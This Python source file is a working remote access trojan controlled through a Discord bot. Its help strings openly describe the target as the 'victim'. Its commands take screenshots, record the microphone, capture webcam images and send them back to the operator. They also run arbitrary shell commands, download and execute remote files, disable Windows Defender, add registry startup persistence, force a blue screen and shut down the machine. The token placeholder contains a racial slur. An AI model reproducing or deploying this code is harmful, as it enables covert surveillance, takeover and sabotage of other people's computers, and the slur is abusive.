import discord
from discord.ext import commands
from PIL import ImageGrab
import io
import pyttsx3
import pyaudio
import wave
import subprocess
import asyncio
from threading import Thread
import pyautogui
import time
import ctypes
import aiohttp
import cv2
import psutil
import webbrowser
import psutil
import winreg
import os
import shutil
import sys


TOKEN = "PUT YOUR NIGGER-TOKEN HERE!"
intents = discord.Intents.all()

bot = commands.Bot(command_prefix='$', intents=intents)
bot.remove_command('help')
pyautogui.FAILSAFE = False

@bot.event
async def on_ready():
    print(f'We have logged in as {bot.user.name}')

@bot.command(help="Takes a screenshot of the victim's screen.")
async def ss(ctx):
    img = ImageGrab.grab()
    with io.BytesIO() as image_binary:
        img.save(image_binary, 'PNG')
        image_binary.seek(0)
        await ctx.reply("Command Executed!", file=discord.File(fp=image_binary, filename="screenshot.png"))

@bot.command(help="Converts the given text into speech on the victim's system.")
async def tts(ctx, *, text: str):
    def tts_thread():
        engine = pyttsx3.init()
        engine.say(text)
        engine.runAndWait()

    thread = Thread(target=tts_thread)
    thread.start()
    
    await ctx.reply("Command Executed!")

@bot.command(help="Records audio from the victim's microphone for 10 seconds.")
async def listen(ctx):
    def recording_thread():
        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 2
        RATE = 44100
        RECORD_SECONDS = 10

        p = pyaudio.PyAudio()

        stream = p.open(format=FORMAT,
                        channels=CHANNELS,
                        rate=RATE,
                        input=True,
                        frames_per_buffer=CHUNK)

        frames = []

        for _ in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
            data = stream.read(CHUNK)
            frames.append(data)

        stream.stop_stream()
        stream.close()
        p.terminate()

        with io.BytesIO() as buf:
            wf = wave.open(buf, 'wb')
            wf.setnchannels(CHANNELS)
            wf.setsampwidth(p.get_sample_size(FORMAT))
            wf.setframerate(RATE)
            wf.writeframes(b''.join(frames))
            wf.close()

            buf.seek(0)
            bot.loop.call_soon_threadsafe(asyncio.create_task, send_response(ctx, buf))

    def send_response(ctx, buf):
        return ctx.reply("Command Executed!", file=discord.File(fp=buf, filename="output.wav"))

    thread = Thread(target=recording_thread)
    thread.start()

@bot.command(help="Runs the specified program on the victim's system.")
async def run(ctx, *, program: str):
    try:
        subprocess.Popen(program, shell=True)
        await ctx.reply("Command Executed!")
    except Exception as e:
        await ctx.reply(f"Error executing command: {str(e)}")

@bot.command(help="Types the given text on the victim's system.")
async def write(ctx, *, text: str):
    try:
        pyautogui.write(text)
        await ctx.reply("Command Executed!")
    except Exception as e:
        await ctx.reply(f"Error executing command: {str(e)}")

@bot.command(help="Presses the 'Enter' key on the victim's system.")
async def enter(ctx):
    try:
        pyautogui.press('enter')
        await ctx.reply("Command Executed!")
    except Exception as e:
        await ctx.reply(f"Error executing command: {str(e)}")

@bot.command(help="Freezes the cursor on the victim's system.")
async def freezecursor(ctx):
    try:
        result = ctypes.windll.user32.BlockInput(True)
        if result == 0:
            await ctx.reply("Failed to freeze cursor. Victim is not running with elevated privileges.")
        else:
            await ctx.reply("Command Executed!")
    except Exception as e:
        await ctx.reply(f"Error executing command: {str(e)}")

@bot.command(help="Unfreezes the cursor on the victim's system.")
async def unfreezecursor(ctx):
    try:
        ctypes.windll.user32.BlockInput(False)
        await ctx.reply("Command Executed!")
    except Exception as e:
        await ctx.reply(f"Error executing command: {str(e)}")

@bot.command(help="Downloads and executes a file from the provided URL on the victim's system.")
async def downloadANDrun(ctx, *, url: str):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as response:
                if response.status != 200:
                    return await ctx.reply("Failed to download the file.")
                
                with open("downloaded_file.exe", "wb") as file:
                    file.write(await response.read())
                
        subprocess.Popen("downloaded_file.exe", shell=True)
        await ctx.reply("Command Executed!")
    except Exception as e:
        await ctx.reply(f"Error executing command: {str(e)}")

@bot.command(help="Attempts to trigger a blue screen on the victim's system.")
async def bluescreen(ctx):
    try:
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.NtRaiseHardError(0xc0000022, 0, 0, 0, 6, ctypes.byref(ctypes.c_long()))
        await ctx.reply("Command Executed!")
    except Exception as e:
        await ctx.reply(f"Error executing command: {str(e)}")

@bot.command(help="Takes a picture on the victim's webcam.")
async def webcampic(ctx):
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            raise Exception("Could not open webcam")
        
        ret, frame = cap.read()
        cap.release()
        
        if not ret:
            raise Exception("Failed to grab frame from webcam")
        
        with io.BytesIO() as buf:
            im_encoded = cv2.imencode(".png", frame)[1]
            buf.write(im_encoded.tobytes())
            buf.seek(0)
            await ctx.reply("Command Executed!", file=discord.File(fp=buf, filename="webcam.png"))
            
    except Exception as e:
        await ctx.reply(f"Error executing command: {str(e)}")

@bot.command(help="Lists all running tasks on the victim's system.")
async def tasks(ctx):
    processes = [p.info for p in psutil.process_iter(['pid', 'name'])]
    
    with io.StringIO() as buf:
        for proc in processes:
            buf.write(f"PID: {proc['pid']} - Name: {proc['name']}\n")
        
        buf.seek(0)
        
        await ctx.reply("List of running tasks:", file=discord.File(fp=buf, filename="tasks.txt"))

@bot.command(help="Attempts to terminate a process on the victim's system using either its PID or name.")
async def kill(ctx, arg: str):
    try:
        pid = int(arg)
        process = psutil.Process(pid)
        process.terminate() 
        await ctx.reply(f"Task with PID {pid} has been terminated!")
    except ValueError:
        terminated = 0
        for proc in psutil.process_iter(['pid', 'name']):
            if proc.info['name'] == arg:
                try:
                    psutil.Process(proc.info['pid']).terminate()
                    terminated += 1
                except psutil.NoSuchProcess:
                    pass
        if terminated > 0:
            await ctx.reply(f"Terminated {terminated} processes with the name {arg}.")
        else:
            await ctx.reply(f"No processes with the name {arg} found.")
    except Exception as e:
        await ctx.reply(f"Error terminating task: {str(e)}")

@bot.command(help="Opens the given website on the victim's default browser and maximizes it.")
async def website(ctx, *, url: str):
    try:
        webbrowser.open(url)
        
        time.sleep(3)

        pyautogui.hotkey('f11')
        
        await ctx.reply(f"Opened and maximized the website: {url}")
    except Exception as e:
        await ctx.reply(f"Error executing command: {str(e)}")

@bot.command(help="Shuts down the victim's system.")
async def shutdown(ctx):
    try:
        os.system('shutdown /s /t 1')
        await ctx.reply("Command Executed! System is shutting down.")
    except Exception as e:
        await ctx.reply(f"Error executing command: {str(e)}")

@bot.command(help="Restarts the victim's system.")
async def restart(ctx):
    try:
        os.system('shutdown /r /t 1')
        await ctx.reply("Command Executed! System is restarting.")
    except Exception as e:
        await ctx.reply(f"Error executing command: {str(e)}")

@bot.command(help="Logs off the current user on the victim's system.")
async def logoff(ctx):
    try:
        os.system('shutdown /l')
        await ctx.reply("Command Executed! Logging off.")
    except Exception as e:
        await ctx.reply(f"Error executing command: {str(e)}")

@bot.command()
async def commands(ctx):
    embed = discord.Embed(title="Available Commands", description="List of all commands", color=0x007BFF)
    
    for command in bot.commands:
        embed.add_field(name=command.name, value=command.help if command.help else "No description provided", inline=False)
    
    await ctx.reply(embed=embed)

@bot.command(help="Disables Windows Defender on the victim's system.")
async def disabledefender(ctx):
    try:
        command = '''powershell -command "Set-MpPreference -DisableRealtimeMonitoring $true"'''
        os.system(command)
        await ctx.reply("Command Executed! Windows Defender's Real-Time Monitoring is now disabled.")
    except Exception as e:
        await ctx.reply(f"Error executing command: {str(e)}")


@bot.command(help="Adds this Python script to the system startup.")
async def startup(ctx):
    try:
        script_path = os.path.abspath(__file__)

        key_name = "Registry"

        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(registry_key, key_name, 0, winreg.REG_SZ, script_path)
        winreg.CloseKey(registry_key)

        await ctx.reply("Command Executed! This Python script has been added to startup.")
    except Exception as e:
        await ctx.reply(f"Error executing command: {str(e)}")

bot.run(TOKEN)
